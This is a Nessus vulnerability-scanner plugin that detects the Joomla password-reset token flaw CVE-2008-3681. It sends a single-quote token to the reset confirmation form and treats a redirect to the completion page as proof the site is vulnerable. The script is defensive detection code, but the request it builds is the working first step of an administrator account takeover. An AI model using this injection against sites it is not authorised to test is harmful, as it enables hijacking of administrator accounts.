#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33882);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2008-3681");
  script_bugtraq_id(30667);
  script_xref(name:"milw0rm", value:"6234");
  script_xref(name:"Secunia", value:"31457");
  script_xref(name:"OSVDB", value:"47476");

  script_name(english:"Joomla! components/com_user/models/reset.php Reset Token Validation Forgery");
  script_summary(english:"Tries to reset a password using an invalid token");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
vulnerability in its password reset mechanism." );
 script_set_attribute(attribute:"description", value:
"The version of Joomla installed on the remote host fails to validate
user-supplied input to the 'token' parameter in the 'confirmReset()'
function in 'components/com_user/models/reset.php' before using it in
a database query.  By entering a single quote character when prompted
for a token in the 'Forgot your Password' form, an unauthenticated
remote attacker can exploit this issue to reset the password of the
first enabled user, typically an administrator." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?386e3955" );
 script_set_attribute(attribute:"solution", value:
"Either patch 'components/com_user/models/reset.php' as discussed in
the advisory or upgrade to Joomla 1.5.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the form exists.
  r = http_send_recv3(method: "GET", 
    item:string(
      dir, "/index.php?", 
      "option=com_user&",
      "view=reset&",
      "layout=confirm"
    ), 
    port:port
  );
  if (isnull(r)) exit(0);

  # If it does...
  if (
    "confirmreset" >< r[2] &&
    'input id="token"' >< r[2]
  )
  {
    # Determine the hidden variable.
    hidden = NULL;

    pat = 'type="hidden" name="([0-9a-fA-F]+)" value="1"';
    matches = egrep(pattern:pat, string:r[2]);
    if (matches)
    {
      foreach match (split(matches))
      {
        match = chomp(match);
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item))
        {
          hidden = item[1];
          break;
        }
      }
    }

    # Try the exploit.
    #
    # nb: this doesn't actually reset the password, only verifies
    #     that the token has been confirmed.
    if (isnull(hidden))
    {
        debug_print("couldn't find the hidden form variable!");
    }
    else
    {
      postdata = string(
        "token='&",
        hidden, "=1"
      );
      url = string(
        dir, "/index.php?", 
        "option=com_user&",
        "task=confirmreset"
      );

      r = http_send_recv3(method: "POST", item: url, version: 11, port: port,
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"), 
 data: postdata );
      if (isnull(r)) exit(0);

      # There's a problem if we're redirected to the confirmation screen.
      if ("option=com_user&view=reset&layout=complete" >< r[2])
      {
        security_hole(port);
        exit(0);
      }
    }
  }
}
